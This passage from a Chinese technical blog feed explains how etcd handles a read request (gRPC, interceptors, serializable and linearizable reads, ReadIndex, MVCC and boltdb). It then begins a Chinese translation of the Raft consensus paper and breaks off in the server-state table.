endpoint），这样可以节省服务器总连接数。在 heavy usage 场景，这可能会造成 server 负载不均衡。</li><li>在 client 3.4 之前的版本中，负载均衡算法有一个严重的 Bug：如果第一个节点异常了，可能会导致你的 client 访问 etcd server 异常，特别是在 Kubernetes 场景中会导致 APIServer 不可用。不过，该 Bug 已在 Kubernetes 1.16 版本后被修复。</li></ul><p>为请求选择好 etcd server 节点，client 就可调用 etcd server 的 KVServer 模块的 Range RPC 方法，把请求发送给 etcd server。</p><p>这里说明一点，client 和 server 之间的通信，使用的是基于 HTTP&#x2F;2 的 gRPC 协议。相比 etcd v2 的 HTTP&#x2F;1.x，HTTP&#x2F;2 是基于二进制而不是文本、支持多路复用而不再有序且阻塞、支持数据压缩以减少包大小、支持 server push 等特性。因此，基于 HTTP&#x2F;2 的 gRPC 协议具有低延迟、高性能的特点，有效解决了我们在上一讲中提到的 etcd v2 中 HTTP&#x2F;1.x 性能问题。</p><h3 id="KVServer"><a href="#KVServer" class="headerlink" title="KVServer"></a>KVServer</h3><p>client 发送 Range RPC 请求到了 server 后，就开始进入我们架构图中的流程二，也就是 KVServer 模块了。</p><p>etcd 提供了丰富的 metrics、日志、请求行为检查等机制，可记录所有请求的执行耗时及错误码、来源 IP 等，也可控制请求是否允许通过，比如 etcd Learner 节点只允许指定接口和参数的访问，帮助大家定位问题、提高服务可观测性等，而这些特性是怎么非侵入式的实现呢？</p><p>答案就是拦截器。</p><h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>etcd server 定义了如下的 Service KV 和 Range 方法，启动的时候它会将实现 KV 各方法的对象注册到 gRPC Server，并在其上注册对应的拦截器。下面的代码中的 Range 接口就是负责读取 etcd key-value 的的 RPC 接口。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-keyword">service </span><span class="hljs-title class_">KV</span> &#123;  <br>  <span class="hljs-comment">// Range gets the keys in the range from the key-value store.  </span><br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> Range(RangeRequest) <span class="hljs-keyword">returns</span> (RangeResponse) </span>&#123;  <br>      <span class="hljs-keyword">option</span> (google.api.http) = &#123;  <br>        post: <span class="hljs-string">&quot;/v3/kv/range&quot;</span>  <br>        body: <span class="hljs-string">&quot;*&quot;</span>  <br>      &#125;;  <br>  &#125;  <br>  ....<br>&#125;  <br></code></pre></td></tr></table></figure><p>拦截器提供了在执行一个请求前后的 hook 能力，除了我们上面提到的 debug 日志、metrics 统计、对 etcd Learner 节点请求接口和参数限制等能力，etcd 还基于它实现了以下特性:</p><ul><li>要求执行一个操作前集群必须有 Leader；</li><li>请求延时超过指定阈值的，打印包含来源 IP 的慢查询日志 (3.5 版本)。</li></ul><p>server 收到 client 的 Range RPC 请求后，根据 ServiceName 和 RPC Method 将请求转发到对应的 handler 实现，handler 首先会将上面描述的一系列拦截器串联成一个执行，在拦截器逻辑中，通过调用 KVServer 模块的 Range 接口获取数据。</p><h3 id="串行读与线性读"><a href="#串行读与线性读" class="headerlink" title="串行读与线性读"></a>串行读与线性读</h3><p>进入 KVServer 模块后，就进入核心的读流程了，对应架构图中的流程三和四。我们知道 etcd 为了保证服务高可用，生产环境一般部署多个节点，那各个节点数据在任意时间点读出来都是一致的吗？什么情况下会读到旧数据呢？</p><p>为了更好的理解读流程，先简单提下写流程。如下图所示，当 client 发起一个更新 hello 为 world 请求后，若 Leader 收到写请求，它会将此请求持久化到 WAL 日志，并广播给各个节点，若一半以上节点持久化成功，则该请求对应的日志条目被标识为已提交，etcdserver 模块异步从 Raft 模块获取已提交的日志条目，应用到状态机 (boltdb 等)。</p><p><img src="https://static001.geekbang.org/resource/image/cf/d5/cffba70a79609f29e1f2ae1f3bd07fd5.png?wh=1920*1074" alt="img"></p><p>此时若 client 发起一个读取 hello 的请求，假设此请求直接从状态机中读取， 如果连接到的是 C 节点，若 C 节点磁盘 I&#x2F;O 出现波动，可能导致它应用已提交的日志条目很慢，则会出现更新 hello 为 world 的写命令，在 client 读 hello 的时候还未被提交到状态机，因此就可能读取到旧数据，如上图查询 hello 流程所示。</p><p>从以上介绍我们可以看出，在多节点 etcd 集群中，各个节点的状态机数据一致性存在差异。而我们不同业务场景的读请求对数据是否最新的容忍度是不一样的，有的场景它可以容忍数据落后几秒甚至几分钟，有的场景要求必须读到反映集群共识的最新数据。</p><p><strong>对数据敏感度较低的场景。</strong></p><p>假如老板让你做一个旁路数据统计服务，希望你每分钟统计下 etcd 里的服务、配置信息等，这种场景其实对数据时效性要求并不高，读请求可直接从节点的状态机获取数据。即便数据落后一点，也不影响业务，毕竟这是一个定时统计的旁路服务而已。这种直接读状态机数据返回、无需通过 Raft 协议与集群进行交互的模式，在 etcd 里叫做串行 (Serializable) 读，它具有低延时、高吞吐量的特点，适合对数据一致性要求不高的场景。</p><p><strong>对数据敏感性高的场景。</strong></p><p>当你发布服务，更新服务的镜像的时候，提交的时候显示更新成功，结果你一刷新页面，发现显示的镜像的还是旧的，再刷新又是新的，这就会导致混乱。再比如说一个转账场景，Alice 给 Bob 转账成功，钱被正常扣出，一刷新页面发现钱又回来了，这也是令人不可接受的。以上的业务场景就对数据准确性要求极高了，在 etcd 里面，提供了一种线性读模式来解决对数据一致性要求高的场景。</p><p><strong>什么是线性读?</strong></p><p>可以理解一旦一个值更新成功，随后任何通过线性读的 client 都能及时访问到。虽然集群中有多个节点，但 client 通过线性读就如访问一个节点一样。etcd 默认读模式是线性读，因为它需要经过 Raft 协议模块，反应的是集群共识，因此在延时和吞吐量上相比串行读略差一点，适用于对数据一致性要求高的场景。如果你的 etcd 读请求显示指定了是串行读，就不会经过架构图流程中的流程三、四。默认是线性读，因此接下来我们看看读请求进入线性读模块，它是如何工作的。</p><p><strong>线性读之 ReadIndex</strong></p><p>前面我们聊到串行读时提到，它之所以能读到旧数据，主要原因是 Follower 节点收到 Leader 节点同步的写请求后，应用日志条目到状态机是个异步过程，那么我们能否有一种机制在读取的时候，确保最新的数据已经应用到状态机中？</p><p><img src="https://static001.geekbang.org/resource/image/1c/cc/1c065788051c6eaaee965575a04109cc.png?wh=1920*1095" alt="img"></p><p>其实这个机制就是叫 <strong>ReadIndex</strong>，它是在 etcd 3.1 中引入的，我把简化后的原理图放在了上面。当收到一个线性读请求时，它首先会从 Leader 获取集群最新的已提交的日志索引 (committed index)，如上图中的流程二所示。</p><p>Leader 收到 ReadIndex 请求时，为防止脑裂等异常场景，会向 Follower 节点发送心跳确认，一半以上节点确认 Leader 身份后才能将已提交的索引 (committed index) 返回给节点 C(上图中的流程三)。</p><p>C 节点则会等待，直到状态机已应用索引 (applied index) 大于等于 Leader 的已提交索引时 (committed Index)(上图中的流程四)，然后去通知读请求，数据已赶上 Leader，你可以去状态机中访问数据了 (上图中的流程五)。</p><p>以上就是线性读通过 ReadIndex 机制保证数据一致性原理， 当然还有其它机制也能实现线性读，如在早期 etcd 3.0 中读请求通过走一遍 Raft 协议保证一致性， 这种 Raft log read 机制依赖磁盘 IO， 性能相比 ReadIndex 较差。</p><p>总体而言，KVServer 模块收到线性读请求后，通过架构图中流程三向 Raft 模块发起 ReadIndex 请求，Raft 模块将 Leader 最新的已提交日志索引封装在流程四的 ReadState 结构体，通过 channel 层层返回给线性读模块，线性读模块等待本节点状态机追赶上 Leader 进度，追赶完成后，就通知 KVServer 模块，进行架构图中流程五，与状态机中的 MVCC 模块进行进行交互了。</p><h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h3><p>流程五中的多版本并发控制 (Multiversion concurrency control) 模块是为了解决 etcd v2 不支持保存 key 的历史版本、不支持多 key 事务等问题而产生的。</p><p>它核心由内存树形索引模块 (treeIndex) 和嵌入式的 KV 持久化存储库 boltdb 组成。</p><p>首先我们需要简单了解下 boltdb，它是个基于 B+ tree 实现的 key-value 键值库，支持事务，提供 Get&#x2F;Put 等简易 API 给 etcd 操作。</p><p>那么 etcd 如何基于 boltdb 保存一个 key 的多个历史版本呢?</p><p>比如我们现在有以下方案：方案 1 是一个 key 保存多个历史版本的值；方案 2 每次修改操作，生成一个新的版本号 (revision)，以版本号为 key， value 为用户 key-value 等信息组成的结构体。</p><p>很显然方案 1 会导致 value 较大，存在明显读写放大、并发冲突等问题，而方案 2 正是 etcd 所采用的。boltdb 的 key 是全局递增的版本号 (revision)，value 是用户 key、value 等字段组合成的结构体，然后通过 treeIndex 模块来保存用户 key 和版本号的映射关系。</p><p>treeIndex 与 boltdb 关系如下面的读事务流程图所示，从 treeIndex 中获取 key hello 的版本号，再以版本号作为 boltdb 的 key，从 boltdb 中获取其 value 信息。</p><p><img src="https://static001.geekbang.org/resource/image/4e/a3/4e2779c265c1da1f7209b5293e3789a3.png?wh=1920*1124" alt="img"></p><h4 id="treeIndext"><a href="#treeIndext" class="headerlink" title="treeIndext"></a>treeIndext</h4><p>reeIndex 模块是基于 Google 开源的内存版 btree 库实现的，为什么 etcd 选择上图中的 B-tree 数据结构保存用户 key 与版本号之间的映射关系，而不是哈希表、二叉树呢？在后面的文章再仔细介绍。</p><p>treeIndex 模块只会保存用户的 key 和相关版本号信息，用户 key 的 value 数据存储在 boltdb 里面，相比 ZooKeeper 和 etcd v2 全内存存储，etcd v3 对内存要求更低。</p><p>简单介绍了 etcd 如何保存 key 的历史版本后，架构图中流程六也就非常容易理解了， 它需要从 treeIndex 模块中获取 hello 这个 key 对应的版本号信息。treeIndex 模块基于 B-tree 快速查找此 key，返回此 key 对应的索引项 keyIndex 即可。索引项中包含版本号等信息。</p><h3 id="buffer"><a href="#buffer" class="headerlink" title="buffer"></a>buffer</h3><p>在获取到版本号信息后，就可从 boltdb 模块中获取用户的 key-value 数据了。不过有一点你要注意，并不是所有请求都一定要从 boltdb 获取数据。</p><p>etcd 出于数据一致性、性能等考虑，在访问 boltdb 前，首先会从一个内存读事务 buffer 中，二分查找你要访问 key 是否在 buffer 里面，若命中则直接返回。</p><h3 id="boltdb"><a href="#boltdb" class="headerlink" title="boltdb"></a>boltdb</h3><p>若 buffer 未命中，此时就真正需要向 boltdb 模块查询数据了，进入了流程七。</p><p>我们知道 MySQL 通过 table 实现不同数据逻辑隔离，那么在 boltdb 是如何隔离集群元数据与用户数据的呢？答案是 bucket。boltdb 里每个 bucket 类似对应 MySQL 一个表，用户的 key 数据存放的 bucket 名字的是 key，etcd MVCC 元数据存放的 bucket 是 meta。</p><p>因 boltdb 使用 B+ tree 来组织用户的 key-value 数据，获取 bucket key 对象后，通过 boltdb 的游标 Cursor 可快速在 B+ tree 找到 key hello 对应的 value 数据，返回给 client。</p><p>到这里，一个读请求之路执行完成。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>一个读请求从 client 通过 Round-robin 负载均衡算法，选择一个 etcd server 节点，发出 gRPC 请求，经过 etcd server 的 KVServer 模块、线性读模块、MVCC 的 treeIndex 和 boltdb 模块紧密协作，完成了一个读请求。</p><p>通过一个读请求，我带你初步了解了 etcd 的基础架构以及各个模块之间是如何协作的。</p><p>在这过程中，特别总结下 client 的节点故障自动转移和线性读。</p><p>一方面， client 的通过负载均衡、错误处理等机制实现了 etcd 节点之间的故障的自动转移，它可助你的业务实现服务高可用，建议使用 etcd 3.4 分支的 client 版本。</p><p>另一方面，我详细解释了 etcd 提供的两种读机制 (串行读和线性读) 原理和应用场景。通过线性读，对业务而言，访问多个节点的 etcd 集群就如访问一个节点一样简单，能简洁、快速的获取到集群最新共识数据。</p><p>早期 etcd 线性读使用的 Raft log read，也就是说把读请求像写请求一样走一遍 Raft 的协议，基于 Raft 的日志的有序性，实现线性读。但此方案读涉及磁盘 IO 开销，性能较差，后来实现了 ReadIndex 读机制来提升读性能，满足了 Kubernetes 等业务的诉求。</p><p><strong>etcd 在执行读请求过程中涉及磁盘 IO 吗？如果涉及，是什么模块在什么场景下会触发呢？如果不涉及，又是什么原因呢？</strong></p><p>etcd 在启动的时候会通过 mmap 机制将 etcd db 文件映射到 etcd 进程地址空间，并设置了 mmap 的 MAP_POPULATE flag，它会告诉 Linux 内核预读文件，Linux 内核会将文件内容拷贝到物理内存中，此时会产生磁盘 I&#x2F;O。节点内存足够的请求下，后续处理读请求过程中就不会产生磁盘 I&#x2F;IO 了。</p><p>若 etcd 节点内存不足，可能会导致 db 文件对应的内存页被换出，当读请求命中的页未在内存中时，就会产生缺页异常，导致读过程中产生磁盘 IO，你可以通过观察 etcd 进程的 majflt 字段来判断 etcd 是否产生了主缺页中断。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>raft论文翻译</title>
    <link href="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/"/>
    <url>/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># 寻找一种易于理解的一致性算法（扩展版）<ul><li><a href="#%E5%AF%BB%E6%89%BE%E4%B8%80%E7%A7%8D%E6%98%93%E4%BA%8E%E7%90%86%E8%A7%A3%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7%E7%AE%97%E6%B3%95%E6%89%A9%E5%B1%95%E7%89%88">寻找一种易于理解的一致性算法（扩展版）</a><ul><li><a href="#%E6%91%98%E8%A6%81">摘要</a></li><li><a href="#1-%E4%BB%8B%E7%BB%8D">1 介绍</a></li><li><a href="#2-%E5%A4%8D%E5%88%B6%E7%8A%B6%E6%80%81%E6%9C%BA">2 复制状态机</a></li><li><a href="#3-paxos-%E7%AE%97%E6%B3%95%E7%9A%84%E9%97%AE%E9%A2%98">3 Paxos 算法的问题</a></li><li><a href="#4-%E4%B8%BA%E4%BA%86%E5%8F%AF%E7%90%86%E8%A7%A3%E6%80%A7%E7%9A%84%E8%AE%BE%E8%AE%A1">4 为了可理解性的设计</a></li><li><a href="#5-raft-%E4%B8%80%E8%87%B4%E6%80%A7%E7%AE%97%E6%B3%95">5 Raft 一致性算法</a><ul><li><a href="#51-raft-%E5%9F%BA%E7%A1%80">5.1 Raft 基础</a></li><li><a href="#52-%E9%A2%86%E5%AF%BC%E4%BA%BA%E9%80%89%E4%B8%BE">5.2 领导人选举</a></li><li><a href="#53-%E6%97%A5%E5%BF%97%E5%A4%8D%E5%88%B6">5.3 日志复制</a></li><li><a href="#54-%E5%AE%89%E5%85%A8%E6%80%A7">5.4 安全性</a><ul><li><a href="#541-%E9%80%89%E4%B8%BE%E9%99%90%E5%88%B6">5.4.1 选举限制</a></li><li><a href="#542-%E6%8F%90%E4%BA%A4%E4%B9%8B%E5%89%8D%E4%BB%BB%E6%9C%9F%E5%86%85%E7%9A%84%E6%97%A5%E5%BF%97%E6%9D%A1%E7%9B%AE">5.4.2 提交之前任期内的日志条目</a></li><li><a href="#543-%E5%AE%89%E5%85%A8%E6%80%A7%E8%AE%BA%E8%AF%81">5.4.3 安全性论证</a></li></ul></li><li><a href="#55-%E8%B7%9F%E9%9A%8F%E8%80%85%E5%92%8C%E5%80%99%E9%80%89%E4%BA%BA%E5%B4%A9%E6%BA%83">5.5 跟随者和候选人崩溃</a></li><li><a href="#56-%E6%97%B6%E9%97%B4%E5%92%8C%E5%8F%AF%E7%94%A8%E6%80%A7">5.6 时间和可用性</a></li></ul></li><li><a href="#6-%E9%9B%86%E7%BE%A4%E6%88%90%E5%91%98%E5%8F%98%E5%8C%96">6 集群成员变化</a></li><li><a href="#7-%E6%97%A5%E5%BF%97%E5%8E%8B%E7%BC%A9">7 日志压缩</a></li><li><a href="#8-%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BA%A4%E4%BA%92">8 客户端交互</a></li><li><a href="#9-%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E5%92%8C%E8%AF%84%E4%BC%B0">9 算法实现和评估</a><ul><li><a href="#91-%E5%8F%AF%E7%90%86%E8%A7%A3%E6%80%A7">9.1 可理解性</a></li><li><a href="#92-%E6%AD%A3%E7%A1%AE%E6%80%A7">9.2 正确性</a></li><li><a href="#93-%E6%80%A7%E8%83%BD">9.3 性能</a></li></ul></li><li><a href="#10-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C">10 相关工作</a></li><li><a href="#11-%E7%BB%93%E8%AE%BA">11 结论</a></li><li><a href="#12-%E6%84%9F%E8%B0%A2">12 感谢</a></li><li><a href="#%E5%8F%82%E8%80%83">参考</a></li></ul></li></ul><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Raft 是一种为了管理复制日志的一致性算法。它提供了和 Paxos 算法相同的功能和性能，但是它的算法结构和 Paxos 不同，使得 Raft 算法更加容易理解并且更容易构建实际的系统。为了提升可理解性，Raft 将一致性算法分解成了几个关键模块，例如领导人选举、日志复制和安全性。同时它通过实施一个更强的一致性来减少需要考虑的状态的数量。一项用户研究的结果表明，对于学生而言，Raft 算法比 Paxos 算法更加容易学习。Raft 算法还包括一个新的机制来允许集群成员的动态改变，它利用重叠的大多数来保证安全性。</p><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1 介绍"></a>1 介绍</h2><p>一致性算法允许一组机器像一个整体一样工作，即使其中一些机器出现故障也能够继续工作下去。正因为如此，一致性算法在构建可信赖的大规模软件系统中扮演着重要的角色。在过去的 10 年里，Paxos 算法统治着一致性算法这一领域：绝大多数的实现都是基于 Paxos 或者受其影响。同时 Paxos 也成为了教学领域里讲解一致性问题时的示例。</p><p>但是不幸的是，尽管有很多工作都在尝试降低它的复杂性，但是 Paxos 算法依然十分难以理解。并且，Paxos 自身的算法结构需要进行大幅的修改才能够应用到实际的系统中。因此工业界和学术界都对 Paxos 算法感到十分头疼。</p><p>努力研究过 Paxos 算法之后，我们开始寻找一种新的一致性算法，可以为构建实际的系统和教学提供更好的基础。与 Paxos 不同，我们的首要目标是可理解性：我们是否可以在实际系统中定义一个一致性算法，并且比 Paxos 算法更容易学习。此外，我们希望该算法方便系统构建者的直觉的发展。重要的不仅仅是算法能够工作，更重要的是能够很清楚地知道它为什么能工作。</p><p>Raft 一致性算法就是这些工作的结果。在设计 Raft 算法的时候，我们使用一些特别的技巧来提升它的可理解性，包括算法分解（Raft 主要被分成了领导人选举，日志复制和安全三个模块）和减少状态机的状态（相对于 Paxos，Raft 减少了非确定性和服务器互相处于非一致性的方式）。一份针对两所大学 43 个学生的研究表明 Raft 明显比 Paxos 算法更加容易理解。在这些学生同时学习了这两种算法之后，和 Paxos 比起来，其中 33 个学生能够回答有关于 Raft 的问题。</p><p>Raft 算法在许多方面和现有的一致性算法都很相似（主要是 Oki 和 Liskov 的 Viewstamped Replication），但是它也有一些独特的特性：</p><ul><li><strong>强领导人</strong>：和其他一致性算法相比，Raft 使用一种更强的领导能力形式。比如，日志条目只从领导人发送给其他的服务器。这种方式简化了对复制日志的管理并且使得 Raft 算法更加易于理解。</li><li><strong>领导选举</strong>：Raft 算法使用一个随机计时器来选举领导人。这种方式只是在任何一致性算法都必须实现的心跳机制上增加了一点机制。在解决冲突的时候会更加简单快捷。</li><li><strong>成员关系调整</strong>：Raft 使用一种共同一致的方法来处理集群成员变换的问题，在这种方法下，处于调整过程中的两种不同的配置集群中大多数机器会有重叠，这就使得集群在成员变换的时候依然可以继续工作。</li></ul><p>我们相信，Raft 算法不论出于教学目的还是作为实践项目的基础都是要比 Paxos 或者其他一致性算法要优异的。它比其他算法更加简单，更加容易理解；它的算法描述足以实现一个现实的系统；它有好多开源的实现并且在很多公司里使用；它的安全特性已经被正式定义和证明；它的效率和其他算法比起来也不相上下。</p><p>接下来，这篇论文会介绍以下内容：复制状态机问题（第 2 节），讨论 Paxos 的优点和缺点（第 3 节），讨论我们为了可理解性而采取的方法（第 4 节），阐述 Raft 一致性算法（第 5-8 节），评价 Raft 算法（第 9 节），以及一些相关的工作（第 10 节）。</p><h2 id="2-复制状态机"><a href="#2-复制状态机" class="headerlink" title="2 复制状态机"></a>2 复制状态机</h2><p>一致性算法是从复制状态机的背景下提出的（参考英文原文引用37）。在这种方法中，一组服务器上的状态机产生相同状态的副本，并且在一些机器宕掉的情况下也可以继续运行。复制状态机在分布式系统中被用于解决很多容错的问题。例如，大规模的系统中通常都有一个集群领导人，像 GFS、HDFS 和 RAMCloud，典型应用就是一个独立的复制状态机去管理领导选举和存储配置信息并且在领导人宕机的情况下也要存活下来。比如 Chubby 和 ZooKeeper。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图1.png" alt="图 1 "></p><blockquote><p>图 1 ：复制状态机的结构。一致性算法管理着来自客户端指令的复制日志。状态机从日志中处理相同顺序的相同指令，所以产生的结果也是相同的。</p></blockquote><p>复制状态机通常都是基于复制日志实现的，如图 1。每一个服务器存储一个包含一系列指令的日志，并且按照日志的顺序进行执行。每一个日志都按照相同的顺序包含相同的指令，所以每一个服务器都执行相同的指令序列。因为每个状态机都是确定的，每一次执行操作都产生相同的状态和同样的序列。</p><p>一致性算法的任务是保证复制日志的一致性。服务器上的一致性模块接收客户端发送的指令然后添加到自己的日志中。它和其他服务器上的一致性模块进行通信来保证每一个服务器上的日志最终都以相同的顺序包含相同的请求，即使有些服务器发生故障。一旦指令被正确的复制，每一个服务器的状态机按照日志顺序处理他们，然后输出结果被返回给客户端。因此，服务器集群看起来形成了一个高可靠的状态机。</p><p>实际系统中使用的一致性算法通常含有以下特性：</p><ul><li>安全性保证（绝对不会返回一个错误的结果）：在非拜占庭错误情况下，包括网络延迟、分区、丢包、重复和乱序等错误都可以保证正确。</li><li>可用性：集群中只要有大多数的机器可运行并且能够相互通信、和客户端通信，就可以保证可用。因此，一个典型的包含 5 个节点的集群可以容忍两个节点的失败。服务器被停止就认为是失败。它们稍后可能会从可靠存储的状态中恢复并重新加入集群。</li><li>不依赖时序来保证一致性：物理时钟错误或者极端的消息延迟只有在最坏情况下才会导致可用性问题。</li><li>通常情况下，一条指令可以尽可能快的在集群中大多数节点响应一轮远程过程调用时完成。小部分比较慢的节点不会影响系统整体的性能。</li></ul><h2 id="3-Paxos-算法的问题"><a href="#3-Paxos-算法的问题" class="headerlink" title="3 Paxos 算法的问题"></a>3 Paxos 算法的问题</h2><p>在过去的 10 年里，Leslie Lamport 的 Paxos 算法几乎已经成为一致性的代名词：Paxos 是在课程教学中最经常使用的算法，同时也是大多数一致性算法实现的起点。Paxos 首先定义了一个能够达成单一决策一致的协议，比如单条的复制日志项。我们把这一子集叫做单决策 Paxos。然后通过组合多个 Paxos 协议的实例来促进一系列决策的达成。Paxos 保证安全性和活性，同时也支持集群成员关系的变更。Paxos 的正确性已经被证明，在通常情况下也很高效。</p><p>不幸的是，Paxos 有两个明显的缺点。第一个缺点是 Paxos 算法特别的难以理解。完整的解释是出了名的不透明；通过极大的努力之后，也只有少数人成功理解了这个算法。因此，有了几次用更简单的术语来解释 Paxos 的尝试。尽管这些解释都只关注了单决策的子集问题，但依然很具有挑战性。在 2012 年 NSDI 的会议中的一次调查显示，很少有人对 Paxos 算法感到满意，甚至在经验老道的研究者中也是如此。我们自己也尝试去理解 Paxos；我们一直没能理解 Paxos 直到我们读了很多对 Paxos 的简化解释并且设计了我们自己的算法之后，这一过程花了近一年时间。</p><p>我们假设 Paxos 的不透明性来自它选择单决策问题作为它的基础。单决策 Paxos 是晦涩微妙的，它被划分成了两种没有简单直观解释和无法独立理解的情景。因此，这导致了很难建立起直观的感受为什么单决策 Paxos 算法能够工作。构成多决策 Paxos 增加了很多错综复杂的规则。我们相信，在多决策上达成一致性的问题（一份日志而不是单一的日志记录）能够被分解成其他的方式并且更加直接和明显。</p><p>Paxos算法的第二个问题就是它没有提供一个足够好的用来构建一个现实系统的基础。一个原因是还没有一种被广泛认同的多决策问题的算法。Lamport 的描述基本上都是关于单决策 Paxos 的；他简要描述了实施多决策 Paxos 的方法，但是缺乏很多细节。当然也有很多具体化 Paxos 的尝试，但是他们都互相不一样，和 Paxos 的概述也不同。例如 Chubby 这样的系统实现了一个类似于 Paxos 的算法，但是大多数的细节并没有被公开。</p><p>而且，Paxos 算法的结构也不是十分易于构建实践的系统；单决策分解也会产生其他的结果。例如，独立地选择一组日志条目然后合并成一个序列化的日志并没有带来太多的好处，仅仅增加了不少复杂性。围绕着日志来设计一个系统是更加简单高效的；新日志条目以严格限制的顺序增添到日志中去。另一个问题是，Paxos 使用了一种对等的点对点的方式作为它的核心（尽管它最终提议了一种弱领导人的方法来优化性能）。在只有一个决策会被制定的简化世界中是很有意义的，但是很少有现实的系统使用这种方式。如果有一系列的决策需要被制定，首先选择一个领导人，然后让他去协调所有的决议，会更加简单快速。</p><p>因此，实际的系统中很少有和 Paxos 相似的实践。每一种实现都是从 Paxos 开始研究，然后发现很多实现上的难题，再然后开发了一种和 Paxos 明显不一样的结构。这样是非常费时和容易出错的，并且理解 Paxos 的难度使得这个问题更加糟糕。Paxos 算法在理论上被证明是正确可行的，但是现实的系统和 Paxos 差别是如此的大，以至于这些证明没有什么太大的价值。下面来自 Chubby 实现非常典型：</p><blockquote><p>在Paxos算法描述和实现现实系统中间有着巨大的鸿沟。最终的系统建立在一种没有经过证明的算法之上。</p></blockquote><p>由于以上问题，我们认为 Paxos 算法既没有提供一个良好的基础给实践的系统，也没有给教学很好的帮助。基于一致性问题在大规模软件系统中的重要性，我们决定看看我们是否可以设计一个拥有更好特性的替代 Paxos 的一致性算法。Raft 算法就是这次实验的结果。</p><h2 id="4-为了可理解性的设计"><a href="#4-为了可理解性的设计" class="headerlink" title="4 为了可理解性的设计"></a>4 为了可理解性的设计</h2><p>设计 Raft 算法我们有几个初衷：它必须提供一个完整的实际的系统实现基础，这样才能大大减少开发者的工作；它必须在任何情况下都是安全的并且在大多数的情况下都是可用的；并且它的大部分操作必须是高效的。但是我们最重要也是最大的挑战是可理解性。它必须保证对于普遍的人群都可以十分容易的去理解。另外，它必须能够让人形成直观的认识，这样系统的构建者才能够在现实中进行必然的扩展。</p><p>在设计 Raft 算法的时候，有很多的点需要我们在各种备选方案中进行选择。在这种情况下，我们评估备选方案基于可理解性原则：解释各个备选方案有多大的难度（例如，Raft 的状态空间有多复杂，是否有微妙的暗示）？对于一个读者而言，完全理解这个方案和暗示是否容易？</p><p>我们意识到对这种可理解性分析上具有高度的主观性；尽管如此，我们使用了两种通常适用的技术来解决这个问题。第一个技术就是众所周知的问题分解：我们尽可能地将问题分解成几个相对独立的，可被解决的、可解释的和可理解的子问题。例如，Raft 算法被我们分成领导人选举，日志复制，安全性和成员变更几个部分。</p><p>我们使用的第二个方法是通过减少状态的数量来简化需要考虑的状态空间，使得系统更加连贯并且在可能的时候消除不确定性。特别的，所有的日志是不允许有空洞的，并且 Raft 限制了日志之间变成不一致状态的可能。尽管在大多数情况下我们都试图消除不确定性，但是也有一些情况下不确定性可以提升可理解性。尤其是，随机化方法增加了不确定性，但是他们有利于减少状态空间数量，通过处理所有可能选择时使用相似的方法。我们使用随机化来简化 Raft 中领导人选举算法。</p><h2 id="5-Raft-一致性算法"><a href="#5-Raft-一致性算法" class="headerlink" title="5 Raft 一致性算法"></a>5 Raft 一致性算法</h2><p>Raft 是一种用来管理章节 2 中描述的复制日志的算法。图 2 为了参考之用，总结这个算法的简略版本，图 3 列举了这个算法的一些关键特性。图中的这些元素会在剩下的章节逐一介绍。</p><p>Raft 通过选举一个杰出的领导人，然后给予他全部的管理复制日志的责任来实现一致性。领导人从客户端接收日志条目（log entries），把日志条目复制到其他服务器上，并告诉其他的服务器什么时候可以安全地将日志条目应用到他们的状态机中。拥有一个领导人大大简化了对复制日志的管理。例如，领导人可以决定新的日志条目需要放在日志中的什么位置而不需要和其他服务器商议，并且数据都从领导人流向其他服务器。一个领导人可能会发生故障，或者和其他服务器失去连接，在这种情况下一个新的领导人会被选举出来。</p><p>通过领导人的方式，Raft 将一致性问题分解成了三个相对独立的子问题，这些问题会在接下来的子章节中进行讨论：</p><ul><li><strong>领导选举</strong>：当现存的领导人发生故障的时候, 一个新的领导人需要被选举出来（章节 5.2）</li><li><strong>日志复制</strong>：领导人必须从客户端接收日志条目（log entries）然后复制到集群中的其他节点，并强制要求其他节点的日志和自己保持一致。</li><li><strong>安全性</strong>：在 Raft 中安全性的关键是在图 3 中展示的状态机安全：如果有任何的服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令。章节 5.4 阐述了 Raft 算法是如何保证这个特性的；这个解决方案涉及到选举机制（5.2 节）上的一个额外限制。</li></ul><p>在展示一致性算法之后，这一章节会讨论一些可用性的问题和计时在系统中的作用。</p><p><strong>状态</strong>：</p><p>所有服务器上的持久性状态<br>(在响应 RPC 请求之前，已经更新到了稳定的存储设备)</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>currentTerm</td><td>服务器已知最新的任期（在服务器首次启动时初始化为0，单调递增）</td></tr><tr><td>votedFor</td><td>当前任期内收到选票的 candidateId，如果没有投给任何候选人 